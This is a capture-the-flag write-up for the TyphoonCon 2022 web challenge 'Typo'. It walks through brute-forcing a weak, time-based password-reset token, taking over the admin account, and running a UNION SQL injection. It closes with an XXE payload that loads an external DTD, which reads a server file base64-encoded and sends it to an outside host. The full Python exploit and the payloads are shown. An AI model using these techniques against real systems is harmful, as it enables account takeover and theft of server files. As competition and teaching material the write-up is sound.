## Challenge Name: `Typo`

Category: Web (I shouldn't even be doing this category)  
Points: 100  

Challenge Description: 
```
I like to count in base 4 and not in base too, this is why this is hard

Look at my source code, as I am sure you can see my typo

https://typhooncon-typo.chals.io/

Flag format: SSD{...}
```
The challenge provided us with the source code of the webpage.


### Approach

Looking at the source code, the only weird thing we managed to find was that when you reset an user's password, they get emailed a token to change the password. When changing it, only the first 4 characters of the token are checked. Might be bruteforcable heh.
The token is calculated so:
```php
$uname = mysqli_real_escape_string($mysqli, $_POST['uname']);
$s = system("date +%s%3N > /tmp/time");
$time = file_get_contents("/tmp/time");
$fullToken = md5( $unam . $time . "SECRET" );
```
Hmm, is the misspelled `$uname` the typo? We know it anyways? Weird.
Anyways we can measure the time our request to the server takes and predict the timestamp. Writing it to a file and reading it back adds a newline though!

What should we do next? Change the password!
From the `robots.txt` file we know, that:
```
# Default username is 'admin' and ID is 1 if you didn't change it
/var/www/flag
```

To change the password we need to provide an ID, a token and the new password.
We can just keep sending password change requests until we see `Password changed` in the response. It's like 200 requests so not that bad.
Once logged in we have access to `data.php` which allows us to craft a sql injection. That's the only sql read, that doesn't sanitize the input.

```php
$uname = $_GET['u'];
$sql = "SELECT email FROM users where username='$uname'";

if( $result = $mysqli->query($sql) ){
	$data = @mysqli_fetch_array($result);
	$email = $data[0];
	echo $email;
}else{
	echo "Erorr";
}
```

We see, that `read.php` could have a XXE, cause it loads a XML file to check if an user exists? lol
Let's leak the UUID that's needed to get access to `read.php` with a sql injection.

### Solution
Using all of that described before. It's time to come up with a multi-part exploit.
Let's reset and change the password with a small python script:

```python
import time
import hashlib
import requests
from threading import Thread
from queue import Queue

INDEX_URL = "https://typhooncon-typo.chals.io/index.php"
RESET_URL = "https://typhooncon-typo.chals.io/forgot.php"
NEW_PASSWORD = 'nestingdoll'
CHANGE_URL = "https://typhooncon-typo.chals.io/change.php"
LOGIN_URL = "https://typhooncon-typo.chals.io/login.php"
DATA_URL = "https://typhooncon-typo.chals.io/data.php"
# Default username is 'admin' and ID is 1 if you didn't change it
# /var/www/flag

# Thanks https://betterprogramming.pub/how-to-make-parallel-async-http-requests-in-python-d0bd74780b8a
class Worker(Thread):
    """ Thread executing tasks from a given tasks queue """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                # An exception happened in this thread
                print(e)
            finally:
                # Mark this task as done, whether an exception happened or not
                self.tasks.task_done()

class ThreadPool:
    """ Pool of threads consuming tasks from a queue """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """ Add a task to the queue """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """ Add a list of tasks to the queue """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """ Wait for completion of all the tasks in the queue """
        self.tasks.join()

session = requests.session()

def postreq(url, parameters):
    return session.post(url, json=parameters).text

def getreq(url, parameters):
    return session.get(url, params=parameters).text

def validatetoken(token):
    payload = {'id': 1, 'sig': token}
    response = session.get(RESET_URL, params=payload)
    results[token] = "viewport" in response.text

results = {}

def run_exploit():
    pool = ThreadPool(30)
    offset = 0
    while True:
        token_hashes = []
        payload = {'uname': 'admin'}
        request_start_time = int(round(time.time() * 1000)) + 4000 + offset
        postreq(RESET_URL, payload)
        request_end_time = int(round(time.time() * 1000)) + 4000 + offset
        for i in range(request_end_time - request_start_time):
            cur_hash = hashlib.md5((str(request_start_time + i) + "\nSECRET").encode('utf-8')).hexdigest()
            if cur_hash[0:4] not in token_hashes:
                token_hashes.append(cur_hash[0:4])

        print("Generated {} md5 hashes for offset {}".format(len(token_hashes), 4000 + offset))
        #print("Checking tokens")
        correct_token = ''
        results.clear()
        # Validate token
        pool.map(validatetoken, token_hashes)
        pool.wait_completion()
        if True in results.values():
            for token in token_hashes:
                if results[token] == True:
                    print("Correct token found: {}".format(token))
                    correct_token = token
                    
            # Change password
            print("Trying to change password with token {}!".format(correct_token))
            payload = {'uid': 1, 'psw': NEW_PASSWORD, 'token': correct_token}
            fheaders = {'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8'}
            response = session.post(CHANGE_URL, headers=fheaders, data=payload).text
            if "Password Changed" in response:
                print("Password changed successfully")
                print("Trying to log in with new password")
                payload = {'uname': 'admin', 'psw': NEW_PASSWORD}
                response = session.post(LOGIN_URL, headers=fheaders, data=payload).text
                if "profile" in response:
                    print("Login successful")

                    print("Trying to find entry")
                    payload = {'u': '\' UNION SELECT user() -- '}
                    response = getreq(DATA_URL, payload)
                    print(response)
                    exit()
                else:
                    print("Unable to log in")
                    print(response)
                    exit()
            else:
                print("Unable to change password")
                exit()
        offset = (offset + 100) % 3100

if __name__ == '__main__':
    print("Starting exploit")
    run_exploit()
```

With the admin password changed we can log on in the browser using username admin and password nestingdoll.

My teammate was able to leak the UUID needed to exploit the XML files. I'm not sure what the correct SQL injection was, but the UUID was `8d6ed261-f84f-4eda-b2d2-16332bd8c390`
Next from the developer console using a small javascript code I was able to send custom XML files to `read.php`
In the end the working XXE hosted a external DTD which sent us the flag.
Used XXE:
`<\?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY % xxe SYSTEM "https://get.station307.com/OwKvYH1R6Mt/test.dtd"> %xxe; %ent; %send;]><user><username>admin</username></user>`
Used DTD:
`<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/flag"><!ENTITY % ent "<!ENTITY &#x25; send SYSTEM 'https://nestingdoll.free.beeceptor.com/?%data;'>">`

As PHP doesn't support newlines in an url, we need to convert the contents of flag to base64. With multiple failed attemps I finally got a request to my beeceptor link with the base64 contents.
Decoding the base64 gives us the flag.
Flag:

```
I wish fllllaggggg was spelllllled with multple gggg and lllll
SSD{19e01769f56207cb4620173f9aa8789ba5b9e71a}
```

---
[Back to home](https://ergoadams.github.io/writeups/typhooncon2022/)